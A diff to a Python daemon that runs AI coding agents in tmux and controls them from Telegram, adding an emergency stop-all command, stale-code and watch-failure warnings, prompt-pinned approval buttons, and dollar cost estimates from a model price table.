-    buttons = menu_buttons(visible(sess))
+    buttons = menu_buttons(pane(sess), bind=True)
     if st.get("nudge_msg"):  # edit: no new message in the topic, no second buzz
         api(cfg, "editMessageText", chat_id=cfg["chat_id"], parse_mode="HTML",
             message_id=st["nudge_msg"], text=html.escape(text), reply_markup=buttons)
@@ -3137,7 +3383,7 @@ def watchdog(cfg, state, topic, sess, alive):
         # cache of the old pane. Dropping them here deleted them from disk too,
         # on the next save, in the one case they exist to survive.
         state[sess] = {k: st[k] for k in ("queue", "limit_until", "sched", "shift",
-                                          "shift_total", "budget_hold") if st.get(k)}
+                                          "shift_total", "budget_hold", "stop_hold") if st.get(k)}
         send(cfg, topic, f"↩️ '{sess}' is back", mode="plain")
     if alive:
         st = state.setdefault(sess, {})          # the branch above rebinds it
@@ -3270,6 +3516,27 @@ def watch_one(cfg, state, lock, topic, sess, alive):
         idle_hint(cfg, state, topic, sess)
 
 
+_watch_errs = {}        # session -> (consecutive failed ticks, the last reason)
+WATCH_TOLD = 30         # failed ticks in a row before the topic is told: about a minute
+
+
+def watch_failed(cfg, topic, sess, why):
+    """watch_one raised. A tick is two seconds, so the same line used to land 172 times
+    in six minutes and bury the rest of the log: it is printed when the reason changes
+    and every 150 ticks after that. And the topic hears of it once, after a minute of
+    it, because a session nobody is watching looks exactly like an idle one."""
+    n, last = _watch_errs.get(sess, (0, None))
+    n, why = n + 1, why[:300]
+    _watch_errs[sess] = n, why
+    if why != last or n % 150 == 0:
+        print(f"watch {sess}: {why}" + (f" (still failing, {n} ticks)" if n > 1 else ""),
+              file=sys.stderr, flush=True)
+    if n == WATCH_TOLD:
+        send(cfg, topic, f"⚠️ nightmux has failed to watch {sess} for a minute straight: {why}\n"
+             "its queue, limit handling and done-notices may be stalled. It keeps trying; "
+             "if this lasts, restart nightmux and report it", mode="plain")
+
+
 def watcher(cfg, state, lock):
     pruned = 0.0
     bound = []
@@ -3304,20 +3571,22 @@ def watcher(cfg, state, lock):
                 with concurrent.futures.ThreadPoolExecutor(
                         max_workers=min(len(bound), 8)) as pool:
                     futures = {pool.submit(watch_one, cfg, state, lock,
-                                            topic, sess, alive): sess
+                                            topic, sess, alive): (topic, sess)
                                for topic, sess in bound}
                     for fut in concurrent.futures.as_completed(futures):
+                        topic, sess = futures[fut]
                         try:
                             fut.result()
+                            _watch_errs.pop(sess, None)
                         except Exception as e:
                             tb = traceback.extract_tb(e.__traceback__)[-1]
-                            print(f"watch {futures[fut]}: {e} "
-                                  f"({tb.name}:{tb.lineno})", file=sys.stderr)
+                            watch_failed(cfg, topic, sess, f"{e} ({tb.name}:{tb.lineno})")
             # One write per tick covers every path that touches a queue,
             # including the ones a future branch adds; the command handler saves
             # inline too, so a prompt is durable before its reply is sent.
             consult_tick(cfg, state)
             auto_update_tick(cfg)
+            stale_tick(cfg)
             failover_tick(cfg, state, lock)
             harvest_tick(cfg, state, lock)
             goal_tick(cfg, state)
@@ -3398,7 +3667,13 @@ def menu_rows(lines):
     rows = [l for l in tail if MENU.match(plain(l))]
     boxed = [l for l in rows if BOXED.match(plain(l))]
     if len(boxed) * 2 > len(rows):
-        return boxed
+        rows = boxed
+    # The options are the last run numbered from 1. A numbered list in the
+    # reply above the dialog, or in the command it asks about, is not more of
+    # them: "2. Run the release command" in a reply was the first "yes" found.
+    ones = [i for i, l in enumerate(rows) if MENU.match(plain(l)).group(1) == "1"]
+    if ones:
+        return rows[ones[-1]:]
     # Claude Code's trust prompt numbers nothing: "❯ No, exit" and, indented to
     # the same column with no pointer, "Yes, I trust this folder". Only the
     # pointed row matched, so the only button was ⏎ — on "No, exit". The rest
@@ -3495,6 +3770,9 @@ def press(sess, key, confirm=False):
     before = visible(sess)
     tmux("send-keys", "-t", tgt(sess), key)
     if not confirm:
+        return
+    if LINE_ASK.search(next((plain(l) for l in reversed(before) if l.strip()), "")):
+        tmux("send-keys", "-t", tgt(sess), "Enter")
         return
     end = time.time() + CONFIRM_AFTER
     while time.time() < end:
@@ -3664,21 +3942,6 @@ def skill_cmd(cfg, topic, arg):
         f.write(f"---\nname: {name}\ndescription: {name} skill generated by nightmux\n---\n\n{text}\n")
     return f"✅ created agy skill '{name}'. You can now use it to save tokens instead of a higher model!\nAsk agy: run the {name} skill"
 
-def upgrade_cmd(cfg, topic):
-    import subprocess
-    import os
-    try:
-        # Run git pull
-        p = subprocess.run(["git", "pull"], cwd=os.path.dirname(os.path.abspath(__file__)), capture_output=True, text=True, timeout=30)
-        out = p.stdout.strip() + "\n" + p.stderr.strip()
-        if "Already up to date." in out:
-            return "🌙 nightmux is already up to date"
-        
-        # It was updated. Provide instructions to restart.
-        return f"🌙 nightmux codebase updated:\n```\n{out}\n```\nRestart the service on the server to apply changes (e.g., `sudo systemctl restart nightmux`)."
-    except Exception as e:
-        return f"🔴 nightmux upgrade failed: {e}"
-
 def update_agents(cfg, only=None):
 
     """Run each installed agent's own updater: [(key, before, after, error)].
@@ -3751,6 +4014,53 @@ def _auto_update(cfg):
     if news:   # nothing changed and nothing failed is not worth a message
         send(cfg, str(cfg.get("center_topic") or "0"),
              "🔄 agent auto-update\n" + update_report(news), mode="plain")
+
+
+SRC_FILES = ("nightmux.py", "nightmux_stop.py", "nightmux_notify.py", "nightmux_state.py")
+BOOT_AT = time.time()
+STALE_AFTER = 120       # an upgrade restarts itself within seconds: only a deploy nobody restarted lasts
+_stale = {"since": 0, "told": False}
+
+
+def code_newer_than(started):
+    """True when one of nightmux's own files was written after `started`: a git checkout
+    or pip install that no restart followed. Python reads its source once, so until the
+    restart none of it is running."""
+    for f in SRC_FILES:
+        try:
+            if os.stat(os.path.join(HERE, f)).st_mtime > started + 2:
+                return True
+        except OSError:
+            pass
+    return False
+
+
+def restart_hint():
+    return ("launchctl kickstart -k gui/$(id -u)/com.nightmux" if sys.platform == "darwin"
+            else "systemctl --user restart nightmux")
+
+
+def service_started():
+    """When the systemd service last started (epoch seconds), or None where that can't be told."""
+    mono = run("systemctl", "--user", "show", "-p", "ActiveEnterTimestampMonotonic",
+               "--value", "nightmux").strip()
+    return time.time() - (time.monotonic() - int(mono) / 1e6) if mono.isdigit() and int(mono) else None
+
+
+def stale_tick(cfg):
+    """Say once that the code on disk is not the code running. A checkout restarts
+    nothing: the daemon this was found in had run one week-old copy through six deploys,
+    so every fix since was on disk and nowhere else."""
+    if not code_newer_than(BOOT_AT):
+        _stale["since"] = 0
+        return
+    now = time.time()
+    _stale["since"] = _stale["since"] or now
+    topic = daemon_topic(cfg)
+    if topic and not _stale["told"] and now - _stale["since"] >= STALE_AFTER:
+        _stale["told"] = True
+        send(cfg, topic, "⚠️ nightmux's files changed on disk after this process started, so the "
+             f"new code is not running.\nrestart it: {restart_hint()}", mode="plain")
 
 
 def agent(cfg, key):
@@ -4376,7 +4686,7 @@ def autoyes(cfg, state, topic, sess):
     """
     keys = (cfg.get("autoyes") or {}).get(str(topic)) or []
     st = state.get(sess) or {}
-    if not keys:
+    if not keys or st.get("stop_hold"):     # a stopped fleet approves nothing
         return
     ak = agent_key(cfg, topic, sess)
     if ak not in keys and "on" not in keys and "all" not in keys:
@@ -4384,7 +4694,9 @@ def autoyes(cfg, state, topic, sess):
         live_key = _agent.get(sess) or (cfg.get("started") or {}).get(str(topic))
         if bound == sess and (live_key in keys or "all" in keys or "on" in keys):
             ak = live_key
-        elif bound == sess and len(keys) == 1 and keys[0] in AGENTS and (ak is None or ak == default_agent(cfg)):
+        # Only a session nothing is known about takes the topic's one agent:
+        # one nightmux started as Claude is not agy because Claude is the default.
+        elif bound == sess and len(keys) == 1 and keys[0] in AGENTS and not live_key:
             ak = keys[0]
         else:
             return
@@ -4411,7 +4723,7 @@ def autoyes(cfg, state, topic, sess):
     if not digit:
         tail = [plain(l) for l in (lines[-15:] if lines else [])]
         tail_text = "\n".join(tail)
-        if re.search(r"[\(\[][yY]/[nN](?:/[aA])?[\)\]]", tail_text) or re.search(r"\b(?:y/n|yes/no)\b", tail_text, re.I):
+        if re.search(r"[\(\[][yY]/[nN](?:/[aA])?[\)\]]", tail_text) or re.search(r"\b(?:y/n|yes/no)\b|\(Y\)es/\(N\)o", tail_text, re.I):
             digit = "y"
         elif re.search(r"(?:Do you want to proceed|Continue\?|Press Enter to continue)", tail_text, re.I):
             digit = "y"
@@ -4752,7 +5064,8 @@ def status_report(cfg, state):
         # and nothing said so — it took a script to notice two topics were.
         tag += "" if snap else " [no status line]"
         q = len(st.get("queue") or [])
-        held = f"  🔒held→{clock(cfg, st['limit_until'])}" if st.get("limit_until", 0) > now else ""
+        held = ("  🛑stopped" if st.get("stop_hold") else
+                f"  🔒held→{clock(cfg, st['limit_until'])}" if st.get("limit_until", 0) > now else "")
         rows.append(f"{icon} {sess:<14} topic {topic}  {mode}  {age}s quiet{tag}"
                     + (f"  📥{q}" if q else "") + held + usage_line(cfg, snap))
     seen, dupes = set(), set()
@@ -4771,7 +5084,7 @@ def status_report(cfg, state):
 WRITE_CMDS = ("!undo", "!upgrade", "!skill", "!raw", "!keys", "!kill", "!new", "!resume", "!restore", "!model",
               "!consult", "!use", "!plan", "!fan", "!autoyes", "!policy",
               "!effort", "!bind", "!unbind", "!reload", "!autocompact", "!tz",
-              "!at", "!every", "!spendcap", "!budget", "!events", "!relay", "!team", "!audit", "!look", "!shift", "!center", "!companion", "!suggest", "!all",
+              "!at", "!every", "!spendcap", "!budget", "!events", "!relay", "!team", "!audit", "!look", "!shift", "!center", "!companion", "!suggest", "!all", "!stopall",
               "!update", "!upgrade",   # run installers on the host: no business in a read-only topic
               "!failover", "!cron",
               "!failover", "!voice",
@@ -4910,6 +5223,7 @@ HELP = [
         "!route auto|off|stats = send each task to the agent that fits it, "
         "learned from results",
         "!all <sess1,sess2|--all> <prompt> = one prompt to several sessions",
+        "!stopall [off] = interrupt every agent and hold every queue, shift, goal and schedule until !stopall off",
         "!center [off] = this topic watches every session · !board = all at a glance",
         "!companion [agent] = a persona over every project: keeps its own memory, hands "
         "work to role agents, acts alone only where a !budget is set",
@@ -4930,7 +5244,7 @@ HELP = [
         "it struggles",
         "!fresh now|on|off = after a green !goal: notes to memory, /clear, re-read",
         "!spendcap <turns|500k|2M|off> = interrupt a runaway loop",
-        "!budget <50M> [day|week|month] | off = a token allowance for this project; "
+        "!budget <50M|$20> [day|week|month] | off = a token or dollar allowance for this project; "
         "once spent, new prompts wait for the next period",
         "!lint on|off = hold a vague prompt for ✨ improve · !coach = what your "
         "first-try prompts have in common",
@@ -5190,6 +5504,9 @@ def handle(cfg, state, lock, topic, text, mid=None):
                     '2. tailscale serve --bg 9090   (reachable from your tailnet only)\n'
                     '3. "office_url": "https://<this machine>.<tailnet>.ts.net/office", '
                     '!reload\nlocally it is already at http://127.0.0.1:<port>/office')
+        why = office_url_problem(url)
+        if why:
+            return f"🏢 {url} {why}, so the button would lead nowhere.\n" + office_fix(cfg, url)
         send(cfg, topic, "🏢 the office — every topic a room, every agent a desk",
              mode="plain", buttons=json.dumps(
                  {"inline_keyboard": [[{"text": "🏢 open office", "url": url}]]}))
@@ -5372,6 +5689,8 @@ def handle(cfg, state, lock, topic, text, mid=None):
         return board_report(cfg, state)
     if cmd == "!all":
         return broadcast(cfg, state, topic, arg)
+    if cmd == "!stopall":
+        return stop_all(cfg, state, arg)
     if cmd == "!digest" and str(topic) == str(cfg.get("center_topic") or ""):
         if arg:
             return "!digest here is report-only — schedule it from each session's own topic"
@@ -5387,6 +5706,13 @@ def handle(cfg, state, lock, topic, text, mid=None):
             st_s["digest_since"] = time.time()
         return "\n\n".join(parts) if parts else "no live sessions"
 
+    # A pinned button ends in `~<fingerprint>` (menu_buttons): peel it off, so
+    # what is left is the session name, if the button carried one.
+    bound = None
+    if cmd in KEYS:
+        m = re.search(r"(?:^|\s)~([0-9a-f]{6})$", arg)
+        if m:
+            bound, arg = m.group(1), arg[:m.start()].strip()
     # A mirrored approval button names its session explicitly, since the
     # command-center topic it may have been tapped in binds to none.
     mirrored = cmd in KEYS and arg and has_session(arg)
@@ -5590,6 +5916,10 @@ def handle(cfg, state, lock, topic, text, mid=None):
         tmux("send-keys", "-t", tgt(sess), *arg.split())
         return None
     if cmd in KEYS:
+        if bound:
+            lines = pane(sess)
+            if bound != prompt_fp(lines):
+                return stale_tap(cfg, state, lock, sess, lines)
         key = KEYS[cmd]
         if cmd in YES_NO:
             key = menu_digit(visible(sess), YES_NO[cmd]) or key
@@ -5628,6 +5958,7 @@ def handle(cfg, state, lock, topic, text, mid=None):
             return f"dropped {len(q)} queued prompt(s)"
         if arg == "now":  # send it anyway, limit or not
             st.pop("limit_until", None)
+            st.pop("stop_hold", None)
             save_queue(state)
             return f"limit hold released, {len(q)} queued prompt(s) resume on idle"
         head = "\n".join(f"{i + 1}. {p.splitlines()[0][:70]}" for i, p in enumerate(q))
@@ -6859,6 +7190,7 @@ def prompt_lessons(home=None):
     opencode_db = os.path.join(h, ".local", "share", "opencode", "opencode.db")
     if os.path.exists(opencode_db):
         try:
+            import sqlite3
             con = sqlite3.connect(f"file:{opencode_db}?mode=ro", uri=True, timeout=2)
             cur_sess = None
             cur_seq = []
@@ -7246,6 +7578,13 @@ h1 svg { width: 44px; height: 44px; filter: drop-shadow(0 0 12px rgba(255, 123, 
 </body></html>"""
 
 
+def render_file(b, src, out, size="1200,1100"):
+    """Chromium `b` draws the local page `src` into the png `out`."""
+    run(b, "--headless=new", "--no-sandbox", "--disable-gpu", "--hide-scrollbars",
+        f"--window-size={size}", "--virtual-time-budget=2000", f"--screenshot={out}",
+        "file://" + os.path.abspath(src), timeout=60)
+
+
 def render_html(cfg, page, size="1200,1100"):
     b = browser_bin(cfg)
     if not b: return None
@@ -7255,9 +7594,7 @@ def render_html(cfg, page, size="1200,1100"):
     src, out = os.path.join(STATE_DIR, f"{f_base}.html"), os.path.join(STATE_DIR, f"{f_base}.png")
     with open(src, "w") as f:
         f.write(page)
-    run(b, "--headless=new", "--no-sandbox", "--disable-gpu", "--hide-scrollbars",
-        f"--window-size={size}", "--virtual-time-budget=2000", f"--screenshot={out}",
-        "file://" + src, timeout=60)
+    render_file(b, src, out, size)
     try:
         with open(out, "rb") as f:
             png = f.read()
@@ -7381,7 +7718,7 @@ def reel_tick(cfg, state, lock):
     if now - _reel["at"] >= REEL_EVERY:
         _reel["at"] = now
         with lock:
-            snap = office_snapshot(cfg, state)
+            snap = office_snapshot(cfg, state, usage=False)
         rec = [{"topic": r["topic"], "name": r["name"],
                 "d": [[d["agent"], d["state"], d["live"], d["queued"]] for d in r["desks"]]}
                for r in snap["rooms"]]
@@ -7702,6 +8039,7 @@ def sav_add(key, n=1):
             for old in sorted(by)[:-400]:
                 del by[old]
         _sav["dirty"] = True
+        return d[key]
 
 
 def sav_save():
@@ -7868,6 +8206,86 @@ def saved_in(d, days, key="tokens"):
     return got + round(before * min(1, (start - (now - days * 86400)) / span))
 
 
+# $ per million tokens: input, output, cache read, cache write. Public list prices
+# from LiteLLM's model_prices_and_context_window.json, read 2026-10-22; a cache price
+# the provider does not publish is its input price. Names match exactly, so a "-pro" or
+# "-mini" never borrows its sibling's price: a model missing here is named and left out
+# of the dollar total. "prices": {"model": [input, output, cache read, cache write]} in
+# the config adds to this or overrides it.
+PRICES_AT = "2026-10-22"
+PRICES = {n: r[1:] for r in (
+    ("claude-fable-5-1", 10, 50, .25, 12.5),
+    ("claude-fable-5", 10, 50, 1, 12.5),
+    ("claude-opus-4-5 claude-opus-4-6 claude-opus-4-7 claude-opus-4-8 claude-opus-5", 5, 25, .5, 6.25),
+    ("claude-opus-5-5", 4, 20, .2, 5),
+    ("claude-sonnet-4-5 claude-sonnet-4-6", 3, 15, .3, 3.75),
+    ("claude-sonnet-5", 2, 10, .2, 2.5),
+    ("claude-sonnet-5-5", 2, 10, .1, 2.5),
+    ("claude-haiku-4-5", 1, 5, .1, 1.25),
+    ("claude-haiku-5-5", .1, .5, .01, .125),
+    ("gpt-5.6 gpt-5.6-sol", 4, 20, .4, 5),
+    ("gpt-5.6-terra", 2, 12, .2, 2.5),
+    ("gpt-5.6-luna", .2, 1.2, .02, .25),
+    ("gpt-5.5", 5, 30, .5, 5),
+    ("gpt-5.4", 2.5, 15, .25, 2.5),
+    ("gpt-5.4-mini", .75, 4.5, .075, .75),
+    ("gpt-5.4-nano", .2, 1.25, .02, .2),
+    ("gpt-5.3-codex gpt-5.2 gpt-5.2-codex", 1.75, 14, .175, 1.75),
+    ("gpt-5 gpt-5-codex gpt-5.1 gpt-5.1-codex gpt-5.1-codex-max", 1.25, 10, .125, 1.25),
+    ("gpt-5-mini gpt-5.1-codex-mini", .25, 2, .025, .25),
+    ("gpt-5-nano", .05, .4, .005, .05),
+    ("gpt-4.1", 2, 8, .5, 2),
+    ("gpt-4.1-mini", .4, 1.6, .1, .4),
+    ("o3", 2, 8, .5, 2),
+    ("o4-mini", 1.1, 4.4, .275, 1.1),
+    ("gemini-2.5-pro", 1.25, 10, .125, 1.25),
+    ("gemini-2.5-flash", .3, 2.5, .03, .3),
+    ("gemini-2.5-flash-lite", .1, .4, .01, .1),
+    ("gemini-3.1-pro-preview", 2, 12, .2, 2),
+    ("gemini-3-flash-preview", .5, 3, .05, .5),
+    ("gemini-3.5-flash", 1.5, 9, .15, 1.5),
+    ("gemini-3.6-flash gemini-3.7-flash gemini-3.8-flash", .75, 3.75, .075, .75),
+) for n in r[0].split()}
+# A model with no price, in a dollar !budget: the dearest rates, never free.
+DEAREST = tuple(map(max, zip(*PRICES.values())))
+
+
+def price_of(model, extra=None):
+    """(input, output, cache read, cache write) $ per million tokens, or None."""
+    n = re.sub(r"(\[.*\]|@.*|-\d{8}|-\d{4}-\d{2}-\d{2}|-latest)$", "", model.lower().rsplit("/", 1)[-1])
+    p = (extra or {}).get(model) or (extra or {}).get(n) or PRICES.get(n)
+    try:
+        p = [float(x) for x in p or ()]
+    except (TypeError, ValueError):
+        return None
+    return tuple(p + [p[0]] * (4 - len(p))) if 2 <= len(p) <= 4 and all(0 <= x < 1e6 for x in p) else None
+
+
+def fleet_cost(agents, extra=None):
+    """What the tokens in analyze_chats()["agents"] would cost at API list prices.
+
+    A model with no price, and tokens that came with no model name, are counted in
+    `left_out` by name — never as free. Subscriptions, batch and long-context tiers
+    bill differently, and cache writes are taken at the five-minute rate."""
+    out = {"total": 0.0, "agents": {}, "models": {}, "left_out": {}}
+    for a, s in agents.items():
+        named = 0
+        for m, t in (s.get("by_model") or {}).items():
+            named += sum(t)
+            p = price_of(m, extra)
+            if not p:
+                out["left_out"][m] = out["left_out"].get(m, 0) + sum(t)
+                continue
+            c = (t[0] * p[0] + t[3] * p[1] + t[1] * p[2] + t[2] * p[3]) / 1e6
+            out["total"] += c
+            out["agents"][a] = out["agents"].get(a, 0) + c
+            out["models"][m] = out["models"].get(m, 0) + c
+        rest = sum((s.get("tokens") or {}).get(k, 0) for k in ("input", "cache_read", "cache_write", "output")) - named
+        if rest > 0:
+            out["left_out"]["(no model name)"] = out["left_out"].get("(no model name)", 0) + rest
+    return out
+
+
 def wrapped_data(cfg, days):
     """Everything on the card: headline numbers, projects, the hours, and what they say."""
     d, r = fleet_sav(cfg), fleet_analysis(cfg, days)
@@ -7879,7 +8297,9 @@ def wrapped_data(cfg, days):
     saved, lighter = saved_in(d, days), saved_in(d, days, "model_tokens")
     r = saved / (toks + saved) if saved and toks else 0
     pct = f"{r:.0%}" if r >= 0.01 or not r else f"{r:.2%}"     # 941k of 3.4B is not 0%
+    cost = fleet_cost(ag, cfg["prices"] if isinstance(cfg.get("prices"), dict) else None)
     cells = [(_k(toks), "TOKENS CRUNCHED"),
+             (_usd(cost["total"]), "AT API LIST PRICES"),
              (pct, f"SAVED FROM THE ABYSS ({_k(saved)})"),
              (_k(lighter), "SAVED VIA SMART ROUTING"),
              (str(prompts), "VIBE DIRECTIVES ISSUED"),
@@ -7887,8 +8307,8 @@ def wrapped_data(cfg, days):
              (str(d.get("night_turns", 0)), "GHOST CODING (WHILE SLEEPING)"),
              (str(d.get("resumes", 0)), "API LIMITS OBLITERATED"),
              (str(d.get("greens", 0)), "CI CHECKS RESCUED"),
-             (str(sum(a["sessions"] or 0 for a in ag.values())), "AGENT SESSIONS")]
-    cells = [c for c in cells if c[0] not in ("0", "0k")][:6]
+             (str(w["active_days"]), "ACTIVE DAYS")]
+    cells = [c for c in cells if c[0] not in ("0", "0k", "0%", "$0.00")][:6]
     ins = []
     if w.get("peak_hour") is not None:
         h = w["peak_hour"]
@@ -7918,7 +8338,7 @@ def wrapped_data(cfg, days):
     split = sorted(((a, sum(v["tokens"].values()), v["requests"] or 0) for a, v in ag.items()),
                    key=lambda x: (-x[1], -x[2]))
     return {"cells": cells, "agents": sorted(ag, key=lambda a: -ag[a]["prompts"]), "split": split,
-            "used": toks, "saved": saved, "lighter": lighter,
+            "used": toks, "saved": saved, "lighter": lighter, "cost": cost, "prompts": prompts,
             "projects": proj[:6], "hours": w.get("hours") or [0] * 24, "insights": ins}
 
 
@@ -8014,11 +8434,13 @@ def share_card_svg(cfg, q=None):
         ag_str = " · ".join(w.get("agents") or ["claude", "codex", "agy"])
     else:
         cells = [(g("tokens", "0"), "TOKENS CRUNCHED"),
+                 (g("usd"), "AT API LIST PRICES"),
                  (g("saved", "0%"), "SAVED FROM ABYSS"),
                  (g("lighter", "0"), "SMART ROUTING"),
                  (g("prompts", "0"), "VIBE DIRECTIVES"),
                  (g("repos", "1"), "REPOS DOMINATED"),
                  (g("night", "0"), "GHOST CODING TURNS")]
+        cells = [c for c in cells if c[0]]            # no usd: a link made before the estimate
         ag_str = g("agents", "claude · codex · agy")
     e = html.escape
     boxes = []
@@ -8063,12 +8485,14 @@ def share_page_html(cfg, q=None, base=""):
     w = wrapped_data(cfg, days)
     cells = w.get("cells") or [("0", "TURNS")]
     top = ", ".join(f"{n} {l}" for n, l in cells[:4])
+    by = {l.split(" (")[0]: n for n, l in cells}      # cells come and go: ask by label
     qs = urllib.parse.urlencode({
         "days": days,
-        "tokens": cells[0][0] if len(cells) > 0 else "0",
-        "saved": cells[1][0] if len(cells) > 1 else "0%",
-        "lighter": cells[2][0] if len(cells) > 2 else "0",
-        "prompts": cells[3][0] if len(cells) > 3 else "0",
+        "tokens": by.get("TOKENS CRUNCHED", "0"),
+        "usd": by.get("AT API LIST PRICES", ""),
+        "saved": by.get("SAVED FROM THE ABYSS", "0%"),
+        "lighter": by.get("SAVED VIA SMART ROUTING", "0"),
+        "prompts": by.get("VIBE DIRECTIVES ISSUED", "0"),
         "repos": len(w.get("projects") or []),
         "agents": " · ".join(w.get("agents") or ["claude"]),
     })
@@ -8199,6 +8623,61 @@ def wrapped_cmd(cfg, topic, arg):
                   buttons=kb([[("📤 share", f"!wrapped share {days}")]]))
     threading.Thread(target=go, daemon=True).start()
     return "📤 uploading the share card…" if share else f"🎁 drawing your {days}-day card…"
+
+
+def wrapped_cli(args, out="."):
+    """`nightmux wrapped [days]`: Wrapped from this machine's agent transcripts alone —
+    no bot, daemon or config. Prints a summary and writes two cards into `out` (a PNG
+    each when Chromium is around, else a web page). Nothing is uploaded."""
+    if len(args) > 1 or (args and not (args[0].isascii() and args[0].isdigit() and 0 < int(args[0]) <= 365)):
+        print("usage: nightmux wrapped [days]    (1 to 365, default 30)", file=sys.stderr)
+        sys.exit(2)
+    days = int(args[0]) if args else 30
+    try:
+        cfg = load_cfg()
+    except (OSError, ValueError):
+        cfg = {}
+    print(f"reading the last {days} days of agent transcripts...", file=sys.stderr)
+    w = wrapped_data(cfg, days)
+    if not w["used"]:
+        sys.exit(f"no agent transcripts found for the last {days} days (looked for Claude Code, "
+                 "Codex, OpenCode and Antigravity in your home folder)")
+    c = w["cost"]
+    print(f"\n🌙 nightmux wrapped · last {days} days · {' · '.join(w['agents'])}\n\n"
+          f"  {_usd(c['total'])} at API list prices · {_k(w['used'])} tokens · "
+          f"{w['prompts']} prompts\n")
+    for a, n, _ in w["split"]:
+        print(f"  {a:<10}{_k(n):>7} tokens {_usd(c['agents'][a]) if a in c['agents'] else '—':>10}")
+    print()
+    for k, v in w["insights"]:
+        print(f"  {k:<16}{v}")
+    if w["projects"]:
+        print(f"  {'projects':<16}" + " · ".join(f"{p} {n}" for p, n in w["projects"]))
+    if c["left_out"]:
+        print("\n  no list price known, so not counted: " + " · ".join(
+            f"{m} {_k(n)}" for m, n in sorted(c["left_out"].items(), key=lambda kv: -kv[1])[:5])
+            + f"\n  ('prices' in {CFG_PATH} adds more; README has the shape)")
+    b = browser_bin(cfg)
+    os.makedirs(out, exist_ok=True)
+    made = []
+    for name, share, note in (("nightmux-wrapped", False, "project names in it: keep this one"),
+                              ("nightmux-wrapped-share", True, "projects as counts only: fine to post")):
+        src, png = os.path.join(out, name + ".html"), os.path.join(out, name + ".png")
+        with open(src, "w", encoding="utf-8") as f:
+            f.write(wrapped_page(days, w, share=share))
+        if b:
+            render_file(b, src, png)
+        if b and os.path.exists(png):
+            os.remove(src)
+            src = png
+        made.append((src, note))
+    print()
+    for path, note in made:
+        print(f"  {path}   {note}")
+    if not b or made[0][0].endswith(".html"):
+        print("  (no Chromium to draw a PNG: open the page in a browser and screenshot it)")
+    print(f"\n  Prices are list prices of {PRICES_AT}; a subscription bills differently. "
+          "Nothing was uploaded.")
 
 
 # ---------- !public: a read-only office anyone can open ----------
@@ -9361,8 +9840,8 @@ def nm_call(name, a, base=None, companion=False):
             text += "".join(f"\n{t}: {names.get(t) or os.path.basename(d)} · no session · {d} "
                             "· send_prompt starts one" for t, d in (c_.get("dirs") or {}).items()
                             if t not in bound and os.path.isdir(d))
-            used, cap = companion_allowance(c_)
-            text += (f"\nyour allowance: {_k(used)} of {_k(cap)} this period — covers projects "
+            used, cap, amt = companion_allowance(c_)
+            text += (f"\nyour allowance: {amt(used)} of {amt(cap)} this period — covers projects "
                      "with no !budget of their own" if cap else
                      "\nno allowance: you act only where a project has its own !budget")
     elif name == "read_terminal":
@@ -9764,7 +10243,7 @@ def companion_allowance(cfg, now=None):
     comp = cfg.get("companion") or {}
     b = (cfg.get("budgets") or {}).get(str(comp.get("topic")))
     if not b:
-        return 0, 0
+        return 0, 0, _k
     start = budget_window(cfg, b["per"], now)[0]
     acted = set()
     try:
@@ -9777,12 +10256,12 @@ def companion_allowance(cfg, now=None):
         pass
     try:
         with open(sav_path()) as f:
-            led = json.load(f).get("spent") or {}
+            led = json.load(f).get("spent_usd" if "usd" in b else "spent") or {}
     except (OSError, ValueError):
         led = {}
     sessions = {s for t in acted for s in set(bench_of(cfg, t).values()) | {cfg["topics"].get(t)}}
     used = sum(n for s in sessions for h, n in (led.get(s) or {}).items() if int(h) >= start // 3600)
-    return int(used), b["tokens"]
+    return (used, b["usd"], _usd) if "usd" in b else (int(used), b["tokens"], _k)
 
 
 def companion_wake(base, cfg, topic):
@@ -9837,12 +10316,12 @@ def companion_prompt(cfg, topic, text, role=None, companion=True):
     if companion and topic == str((cfg.get("companion") or {}).get("topic")):
         raise ValueError("that is your own topic — send work to a project")
     if companion and topic not in (cfg.get("budgets") or {}):
-        used, cap = companion_allowance(cfg)
+        used, cap, amt = companion_allowance(cfg)
         if not cap:
             raise ValueError(f"topic {topic} has no !budget and you have no allowance — "
                              "suggest it instead, or ask the owner for a !budget in your topic")
         if used >= cap:
-            raise ValueError(f"your allowance is spent ({_k(used)} of {_k(cap)}) — suggest "
+            raise ValueError(f"your allowance is spent ({amt(used)} of {amt(cap)}) — suggest "
                              "it instead; it resets with the period")
     if not role:
         return text
@@ -10337,7 +10816,7 @@ def goal_tick(cfg, state):
         # Not while it is busy, held, or has more of your prompts to get through:
         # the check is for the work as you left it, not half of it.
         if (topic in _goal_run or st.get("queue") or st.get("mode") != "idle"
-                or st.get("limit_until", 0) > now):
+                or st.get("limit_until", 0) > now or st.get("stop_hold")):
             continue
         _goal_due.pop(topic, None)
         run = _goal_run[topic] = {"sess": sess}
@@ -10427,6 +10906,10 @@ def send_prompt(cfg, state, topic, sess, text, mid=None):
     _loop.pop(topic, None)   # ...and whatever looked like a loop was before you
     if topic in _pair:
         _pair[topic]["rounds"] = 0
+    if st.get("stop_hold"):
+        st.setdefault("queue", []).append(text)
+        save_queue(state)
+        return f"📥 queued ({len(st['queue'])}) · everything is stopped\n!stopall off to go again"
     until = st.get("limit_until", 0)
     if until > time.time():  # the window is spent; hold it rather than lose it
         st.setdefault("queue", []).append(text)
@@ -10516,6 +10999,32 @@ def broadcast(cfg, state, topic, arg):
     return None
 
 
+def stop_all(cfg, state, arg):
+    """!stopall: the brake for a night gone wrong. Every agent of every topic has
+    its turn interrupted, as the spend cap interrupts one, and nothing starts
+    again until !stopall off: prompts, shifts and schedules queue, goal loops,
+    failover, auto-yes and autocompact wait. A flag of its own, not a
+    limit_until: a usage window that resets must not lift it."""
+    if arg.strip().lower() == "off":
+        lifted = [s for s, o in list(state.items()) if o.pop("stop_hold", None)]
+        save_queue(state)
+        return (f"▶️ {len(lifted)} session(s) go again · queues resume on idle" if lifted
+                else "nothing was stopped")
+    if arg.strip():
+        return "usage: !stopall [off]"
+    hit = []
+    for s in sorted({s for t, m in cfg.get("topics", {}).items()
+                     for s in set(bench_of(cfg, t).values()) | {m}}):
+        state.setdefault(s, {})["stop_hold"] = True
+        if has_session(s) and pane_state(visible(s)) in ("busy", "waiting"):
+            tmux("send-keys", "-t", tgt(s), "C-c")
+            s += " (interrupted)"
+        hit.append(s)
+    save_queue(state)
+    return (f"🛑 stopped {len(hit)}: {', '.join(hit)}\nprompts, shifts and schedules queue; "
+            "goals, failover and auto-yes wait · !stopall off to go again" if hit else "no session to stop")
+
+
 def board_report(cfg, state):
     """Every topic at a glance — !status's own state classification, plus a
     cheap per-session cost figure where a transcript is already known.
